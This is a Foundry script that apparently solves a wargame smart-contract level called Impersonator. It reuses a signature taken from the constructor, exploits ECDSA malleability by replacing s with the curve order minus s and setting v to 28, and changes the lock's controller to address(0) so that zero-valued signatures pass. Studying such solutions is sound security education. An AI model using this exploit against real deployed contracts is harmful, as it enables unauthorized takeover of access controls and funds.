// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Impersonator, ECLocker } from "../src/Impersonator.sol";

contract ImpersonatorSolver is Script {
	
	Impersonator public instance = Impersonator(0x4805c833dEd50857f69cbF3903ee7ee9171CAB9E);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);



		// console.log("=== just playing with ECDSA on blockchain");
		// bytes32 msgHash = keccak256("look at me am mr meessix");
		// (uint8 v, bytes32 r, bytes32 s) = vm.sign(prv, msgHash);
		
		// console.logBytes32(bytes32(bytes1(v)));
		// console.logBytes32(r);
		// console.logBytes32(s);

		// address result = ecrecover(msgHash, v, r, s);

		// console.log("signer of msg --> ", result);


		console.log("LOGGING THE CONCERNED STATE OF THE INSTANCE");
		console.logBytes32(vm.load(address(instance), bytes32(uint256(0))));
		console.logBytes32(vm.load(address(instance), bytes32(uint256(1))));
		console.logBytes32(vm.load(address(instance), bytes32(uint256(2))));
		console.logBytes32(vm.load(address(instance), bytes32(uint256(3))));

		console.logBytes32(bytes32(instance.lockCounter()));

		ECLocker lock = ECLocker(address(instance.lockers(0)));
		console.log("address of the lock : ");
		console.log(address(lock));
		console.logBytes32(bytes32(lock.lockId()));


		bytes32 msgHash = keccak256(
			bytes.concat(
				bytes28("\x19Ethereum Signed Message:\n32"),
				bytes32(lock.lockId())
			)
		);
		console.logBytes32(msgHash);
		// (uint8 v_test, bytes32 r_test, bytes32 s_test) = vm.sign(prv, msgHash);

		// console.log(lock.controller());
		// console.logBytes32(lock.msgHash());
		// lock.open(v_test, r_test, s_test);



		// from the block explorer i got the signature at contruction 

		// 1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B
		
		
		bytes memory _signature = hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B";


		

		bytes32 v;
		bytes32 r;
		bytes32 s;

		assembly {
		
            		v := mload(add(_signature, 0x60)) // 32 byte v
            		r := mload(add(_signature, 0x20)) // 32 bytes r
            		s := mload(add(_signature, 0x40)) // 32 bytes s

		}

		console.log("====== Logging the LEAKS  ========");
		
		console.logBytes(_signature);
		console.logBytes32(v);
		console.logBytes32(r);
		console.logBytes32(s);


		// since we know v is 27 lets just hardcode it, it dont wanna work otherwise
		uint256 orderOfEC = 115792089237316195423570985008687907852837564279074904382605163141518161494337;

		s = bytes32((orderOfEC - uint256(s)));

		// lock.open(uint8(uint256(v)), r, s);
		// lock.open(27, r, s); // this is valid but already used
		// lock.open(28, r, s); // it was a success


		console.log("|||| changing the controller ||||");
		console.log(lock.controller());
		lock.changeController(28, r, s, address(0)); // am setting it to 0 so that anyone can enter by giving it v, r and s as zeros
		
		// and there is no problem using it twice because by setting r and s to zero you can set v to 
		// and you still get 0	       
		console.log(lock.controller());

		console.log(ecrecover(keccak256("nothing much"), 100, 0, 0));


		vm.stopBroadcast();


	}

}
